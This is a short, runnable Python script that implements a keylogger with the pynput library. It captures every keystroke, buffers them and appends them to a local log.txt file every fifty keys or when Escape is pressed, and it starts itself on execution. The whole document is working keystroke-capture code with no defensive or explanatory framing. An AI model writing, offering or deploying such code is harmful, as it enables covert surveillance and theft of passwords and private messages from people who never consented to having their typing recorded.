from pynput.keyboard import Key, Listener


class KeyLogger:

    def __init__(self):
        self.listener = Listener(
            on_press=self.on_press, on_release=self.on_release)
        self.keys = []
        self.count = 0

    def on_press(self, key):
        if not isinstance(key, (Key)):
            key = key.char
        self.keys.append(key)
        self.count += 1

        if self.count >= 50:
            self.log_file()

    def on_release(self, key):
        if key == Key.esc:
            self.log_file()
            return False

    def log_file(self):
        with open('log.txt', 'a') as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                f.write(k)
                f.write(' ')
            f.write('\n')
            self.count = 0
            self.keys = []

    def start(self):
        self.listener.start()
        self.listener.join()


#Run keylogger
pyLog = KeyLogger()
pyLog.start()
